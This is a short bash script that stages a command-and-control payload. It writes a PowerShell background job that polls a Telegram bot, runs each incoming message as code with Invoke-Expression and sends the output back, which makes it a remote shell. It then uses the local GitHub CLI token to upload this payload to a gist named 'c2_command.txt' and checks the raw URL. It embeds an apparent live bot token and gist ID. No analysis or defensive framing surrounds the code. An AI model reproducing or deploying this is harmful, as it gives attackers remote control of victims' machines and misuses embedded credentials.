#!/bin/bash
TOKEN="7565844986:AAHOcE2LUPp4MU55UHg5Fnsf4dh11DLFkRk"
GIST_ID="99a46fc04b180fffdafc03584c0d5a2e"

CMD="start-job -ScriptBlock { \$TOKEN='${TOKEN}'; \$OFFSET=0; function sd(\$cid,\$t){try{\$b=@{chat_id=\$cid;text=\$t}|ConvertTo-Json -Compress;irm -Uri \"https://api.telegram.org/bot\$TOKEN/sendMessage\" -Method Post -Body \$b -ContentType 'application/json' -TimeoutSec 10}catch{}}; while(\$true){try{\$r=irm -Uri \"https://api.telegram.org/bot\$TOKEN/getUpdates?offset=\$OFFSET&timeout=30\" -TimeoutSec 35;if(\$r.result){foreach(\$u in \$r.result){\$OFFSET=\$u.update_id+1;\$cid=\$u.message.chat.id;\$cmd=\$u.message.text.Trim();if(-not \$cmd){continue};sd \$cid \"Running: \$cmd\";try{\$o=iex \$cmd 2>&1|Out-String}catch{\$o=\"ERROR: \$_\"};if(\$o.Length -gt 3800){\$o=\$o.Substring(0,3800)+'...[TRUNCATED]'};sd \$cid \"\$o\"}}}catch{Start-Sleep 5}}} }"

GH_TOKEN=$(gh auth token)

curl -sk -X PATCH "https://api.github.com/gists/${GIST_ID}" \
  -H "Authorization: Bearer ${GH_TOKEN}" \
  -H "Accept: application/vnd.github+json" \
  -H "X-GitHub-Api-Version: 2022-11-28" \
  -H "User-Agent: curl" \
  -d "{\"files\":{\"c2_command.txt\":{\"content\":$(echo "$CMD" | python3 -c 'import json,sys; print(json.dumps(sys.stdin.read()))')}}}" \
  2>&1 | python3 -c "import json,sys; r=json.load(sys.stdin); print('Updated:', r.get('updated_at','FAIL'))"

echo "---"
echo "Token length check:"
curl -sk "https://gist.githubusercontent.com/vLoon-jpg/${GIST_ID}/raw/c2_command.txt" | wc -c
